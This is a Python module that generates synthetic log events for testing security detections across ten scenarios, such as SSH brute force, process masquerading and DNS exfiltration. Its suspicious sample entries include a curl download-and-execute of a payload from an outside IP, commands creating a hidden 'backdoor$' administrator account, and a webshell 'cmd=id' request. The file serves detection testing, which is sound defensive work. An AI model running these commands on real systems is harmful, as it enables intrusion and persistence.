"""Generates realistic but entirely synthetic (fake) log events for detection testing."""

import random
from datetime import datetime, timedelta
from typing import Any


_WINDOWS_HOSTS = ["WIN-LAB-01", "WIN-LAB-02", "WORKSTATION-42", "SRV-WIN-01"]
_LINUX_HOSTS = ["ubuntu-lab", "kali-lab", "centos-srv", "debian-wks"]
_USERS = ["lab.user", "testuser", "analyst", "admin.lab"]
_IPS_INTERNAL = ["192.168.1.10", "192.168.1.20", "10.0.0.5", "172.16.0.3"]
_IPS_EXTERNAL = ["185.220.101.45", "198.51.100.42", "203.0.113.99", "45.33.32.156"]


def _ts(base: datetime, offset_secs: int = 0) -> str:
    return (base + timedelta(seconds=offset_secs)).strftime("%Y-%m-%dT%H:%M:%SZ")


def generate_powershell_events(base_time: datetime, count: int = 6) -> list[dict[str, Any]]:
    host = random.choice(_WINDOWS_HOSTS)
    user = random.choice(_USERS)
    events = []
    benign_cmds = [
        "powershell.exe -NoProfile -Command Get-Date",
        "powershell.exe Get-Process",
        "powershell.exe -Command Write-Host Hello",
        "powershell.exe Get-ChildItem C:\\Windows",
        "powershell.exe -Command Get-Service",
    ]
    for i in range(count - 1):
        events.append({
            "timestamp": _ts(base_time, i * 10),
            "source": "windows_security",
            "host": host,
            "user": user,
            "event_type": "process_creation",
            "event_id": 4688,
            "process_name": "powershell.exe",
            "command_line": benign_cmds[i % len(benign_cmds)],
            "src_ip": None,
            "dst_ip": None,
            "raw_message": "Synthetic process creation event for detection testing",
            "is_suspicious": False,
        })
    # Suspicious event
    events.append({
        "timestamp": _ts(base_time, (count - 1) * 10),
        "source": "windows_security",
        "host": host,
        "user": user,
        "event_type": "process_creation",
        "event_id": 4688,
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -NoProfile -EncodedCommand <synthetic-demo-value>",
        "src_ip": None,
        "dst_ip": None,
        "raw_message": "Synthetic suspicious PowerShell encoded command event",
        "is_suspicious": True,
    })
    return events


def generate_ssh_bruteforce_events(base_time: datetime, count: int = 10) -> list[dict[str, Any]]:
    host = random.choice(_LINUX_HOSTS)
    attacker_ip = random.choice(_IPS_EXTERNAL)
    events = []
    for i in range(count - 1):
        events.append({
            "timestamp": _ts(base_time, i * 3),
            "source": "linux_auth",
            "host": host,
            "user": f"user{i}",
            "event_type": "auth_failure",
            "event_id": None,
            "process_name": "sshd",
            "command_line": None,
            "src_ip": attacker_ip,
            "dst_ip": random.choice(_IPS_INTERNAL),
            "raw_message": f"Synthetic Failed password for user{i} from {attacker_ip} port {22000 + i}",
            "is_suspicious": False,
        })
    events.append({
        "timestamp": _ts(base_time, (count - 1) * 3),
        "source": "linux_auth",
        "host": host,
        "user": "root",
        "event_type": "auth_failure",
        "event_id": None,
        "process_name": "sshd",
        "command_line": None,
        "src_ip": attacker_ip,
        "dst_ip": random.choice(_IPS_INTERNAL),
        "raw_message": f"Synthetic Failed password for root from {attacker_ip} port 22099",
        "is_suspicious": True,
    })
    return events


def generate_new_admin_user_events(base_time: datetime, count: int = 3) -> list[dict[str, Any]]:
    host = random.choice(_WINDOWS_HOSTS)
    events = [
        {
            "timestamp": _ts(base_time, 0),
            "source": "windows_security",
            "host": host,
            "user": "SYSTEM",
            "event_type": "user_created",
            "event_id": 4720,
            "process_name": "net.exe",
            "command_line": "net user backdoor$ P@ssw0rd! /add",
            "src_ip": None,
            "dst_ip": None,
            "raw_message": "Synthetic user account creation event",
            "is_suspicious": False,
        },
        {
            "timestamp": _ts(base_time, 5),
            "source": "windows_security",
            "host": host,
            "user": "SYSTEM",
            "event_type": "group_member_added",
            "event_id": 4732,
            "process_name": "net.exe",
            "command_line": "net localgroup administrators backdoor$ /add",
            "src_ip": None,
            "dst_ip": None,
            "raw_message": "Synthetic member added to Administrators group",
            "is_suspicious": True,
        },
        {
            "timestamp": _ts(base_time, 10),
            "source": "windows_security",
            "host": host,
            "user": "SYSTEM",
            "event_type": "user_enabled",
            "event_id": 4722,
            "process_name": None,
            "command_line": None,
            "src_ip": None,
            "dst_ip": None,
            "raw_message": "Synthetic user account enabled event",
            "is_suspicious": False,
        },
    ]
    return events[:count]


def generate_scheduled_task_events(base_time: datetime, count: int = 4) -> list[dict[str, Any]]:
    host = random.choice(_WINDOWS_HOSTS)
    user = random.choice(_USERS)
    return [
        {
            "timestamp": _ts(base_time, i * 15),
            "source": "windows_security",
            "host": host,
            "user": user,
            "event_type": "scheduled_task_created",
            "event_id": 4698,
            "process_name": "schtasks.exe",
            "command_line": f'schtasks /create /tn "SyntheticTask{i}" /tr "cmd.exe /c echo test" /sc daily',
            "src_ip": None,
            "dst_ip": None,
            "raw_message": "Synthetic scheduled task creation event",
            "is_suspicious": i == count - 1,
        }
        for i in range(count)
    ]


def generate_temp_process_events(base_time: datetime, count: int = 5) -> list[dict[str, Any]]:
    host = random.choice(_WINDOWS_HOSTS)
    user = random.choice(_USERS)
    benign = [
        ("notepad.exe", r"C:\Users\lab.user\AppData\Local\Temp\note.exe"),
        ("calc.exe", r"C:\Windows\Temp\calc_copy.exe"),
    ]
    events = []
    for i in range(count - 1):
        proc, cmd = benign[i % len(benign)]
        events.append({
            "timestamp": _ts(base_time, i * 8),
            "source": "windows_security",
            "host": host,
            "user": user,
            "event_type": "process_creation",
            "event_id": 4688,
            "process_name": proc,
            "command_line": cmd,
            "src_ip": None,
            "dst_ip": None,
            "raw_message": "Synthetic process from temp directory",
            "is_suspicious": False,
        })
    events.append({
        "timestamp": _ts(base_time, (count - 1) * 8),
        "source": "windows_security",
        "host": host,
        "user": user,
        "event_type": "process_creation",
        "event_id": 4688,
        "process_name": "malware_simulation.exe",
        "command_line": r"C:\Windows\Temp\malware_simulation.exe /synthetic",
        "src_ip": None,
        "dst_ip": None,
        "raw_message": "Synthetic execution from Windows Temp directory",
        "is_suspicious": True,
    })
    return events


def generate_curl_download_events(base_time: datetime, count: int = 5) -> list[dict[str, Any]]:
    host = random.choice(_LINUX_HOSTS)
    user = random.choice(_USERS)
    events = []
    for i in range(count - 1):
        events.append({
            "timestamp": _ts(base_time, i * 12),
            "source": "linux_process",
            "host": host,
            "user": user,
            "event_type": "process_creation",
            "event_id": None,
            "process_name": "curl",
            "command_line": f"curl https://example.com/resource{i}",
            "src_ip": random.choice(_IPS_INTERNAL),
            "dst_ip": "93.184.216.34",
            "raw_message": "Synthetic curl benign request",
            "is_suspicious": False,
        })
    events.append({
        "timestamp": _ts(base_time, (count - 1) * 12),
        "source": "linux_process",
        "host": host,
        "user": user,
        "event_type": "process_creation",
        "event_id": None,
        "process_name": "curl",
        "command_line": "curl -o /tmp/payload.sh http://198.51.100.42/payload.sh && bash /tmp/payload.sh",
        "src_ip": random.choice(_IPS_INTERNAL),
        "dst_ip": "198.51.100.42",
        "raw_message": "Synthetic curl download-and-execute pattern",
        "is_suspicious": True,
    })
    return events


def generate_process_masquerading_events(base_time: datetime, count: int = 5) -> list[dict[str, Any]]:
    host = random.choice(_WINDOWS_HOSTS)
    user = random.choice(_USERS)
    events = []
    for i in range(count - 1):
        events.append({
            "timestamp": _ts(base_time, i * 10),
            "source": "windows_security",
            "host": host,
            "user": user,
            "event_type": "process_creation",
            "event_id": 4688,
            "process_name": "svchost.exe",
            "command_line": r"C:\Windows\System32\svchost.exe -k netsvcs",
            "src_ip": None,
            "dst_ip": None,
            "raw_message": "Synthetic legitimate svchost event",
            "is_suspicious": False,
        })
    events.append({
        "timestamp": _ts(base_time, (count - 1) * 10),
        "source": "windows_security",
        "host": host,
        "user": user,
        "event_type": "process_creation",
        "event_id": 4688,
        "process_name": "svch0st.exe",
        "command_line": r"C:\Users\lab.user\AppData\Local\svch0st.exe",
        "src_ip": None,
        "dst_ip": None,
        "raw_message": "Synthetic process masquerading as svchost with typosquat",
        "is_suspicious": True,
    })
    return events


def generate_abnormal_login_events(base_time: datetime, count: int = 5) -> list[dict[str, Any]]:
    host = "identity-provider"
    events = []
    for i in range(count - 1):
        normal_hour = datetime(2026, 1, 10, 9, 0, 0) + timedelta(hours=i)
        events.append({
            "timestamp": normal_hour.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source": "iam_logs",
            "host": host,
            "user": random.choice(_USERS),
            "event_type": "authentication_success",
            "event_id": None,
            "process_name": None,
            "command_line": None,
            "src_ip": random.choice(_IPS_INTERNAL),
            "dst_ip": None,
            "raw_message": "Synthetic normal business hours login",
            "is_suspicious": False,
        })
    # 3h AM login
    off_hours = datetime(2026, 1, 10, 3, 17, 0)
    events.append({
        "timestamp": off_hours.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "source": "iam_logs",
        "host": host,
        "user": "admin.lab",
        "event_type": "authentication_success",
        "event_id": None,
        "process_name": None,
        "command_line": None,
        "src_ip": random.choice(_IPS_EXTERNAL),
        "dst_ip": None,
        "raw_message": "Synthetic off-hours login from external IP at 03:17",
        "is_suspicious": True,
    })
    return events


def generate_webshell_events(base_time: datetime, count: int = 6) -> list[dict[str, Any]]:
    host = "web-srv-01"
    events = []
    benign_paths = ["/index.php", "/about.html", "/api/status", "/login", "/assets/app.js"]
    for i in range(count - 1):
        events.append({
            "timestamp": _ts(base_time, i * 5),
            "source": "web_access",
            "host": host,
            "user": "-",
            "event_type": "http_request",
            "event_id": None,
            "process_name": None,
            "command_line": f"GET {benign_paths[i % len(benign_paths)]} HTTP/1.1",
            "src_ip": random.choice(_IPS_INTERNAL),
            "dst_ip": None,
            "raw_message": f"Synthetic benign web request to {benign_paths[i % len(benign_paths)]}",
            "is_suspicious": False,
        })
    events.append({
        "timestamp": _ts(base_time, (count - 1) * 5),
        "source": "web_access",
        "host": host,
        "user": "-",
        "event_type": "http_request",
        "event_id": None,
        "process_name": None,
        "command_line": "GET /uploads/shell.php?cmd=id HTTP/1.1",
        "src_ip": random.choice(_IPS_EXTERNAL),
        "dst_ip": None,
        "raw_message": "Synthetic webshell-like HTTP request with cmd parameter",
        "is_suspicious": True,
    })
    return events


def generate_dns_exfil_events(base_time: datetime, count: int = 8) -> list[dict[str, Any]]:
    host = random.choice(_LINUX_HOSTS)
    events = []
    for i in range(count - 1):
        events.append({
            "timestamp": _ts(base_time, i * 4),
            "source": "dns_logs",
            "host": host,
            "user": "-",
            "event_type": "dns_query",
            "event_id": None,
            "process_name": None,
            "command_line": None,
            "src_ip": random.choice(_IPS_INTERNAL),
            "dst_ip": "8.8.8.8",
            "raw_message": f"Synthetic DNS query for normal{i}.example.com",
            "is_suspicious": False,
        })
    # DNS exfil pattern: long subdomain with base64-like data
    events.append({
        "timestamp": _ts(base_time, (count - 1) * 4),
        "source": "dns_logs",
        "host": host,
        "user": "-",
        "event_type": "dns_query",
        "event_id": None,
        "process_name": None,
        "command_line": None,
        "src_ip": random.choice(_IPS_INTERNAL),
        "dst_ip": "198.51.100.1",
        "raw_message": "Synthetic DNS exfil pattern: dGVzdGRhdGFleGZpbA==.evil-c2.net",
        "is_suspicious": True,
    })
    return events


_GENERATORS = {
    "suspicious-powershell": generate_powershell_events,
    "ssh-bruteforce": generate_ssh_bruteforce_events,
    "new-admin-user": generate_new_admin_user_events,
    "scheduled-task-creation": generate_scheduled_task_events,
    "temp-process-execution": generate_temp_process_events,
    "suspicious-curl-download": generate_curl_download_events,
    "process-masquerading": generate_process_masquerading_events,
    "abnormal-login-time": generate_abnormal_login_events,
    "webshell-like-request": generate_webshell_events,
    "dns-exfil-pattern": generate_dns_exfil_events,
}


def generate_events_for_scenario(
    scenario_id: str, base_time: datetime | None = None
) -> list[dict[str, Any]]:
    if base_time is None:
        base_time = datetime.utcnow()
    generator = _GENERATORS.get(scenario_id)
    if generator is None:
        raise ValueError(f"No generator defined for scenario: {scenario_id}")
    return generator(base_time)
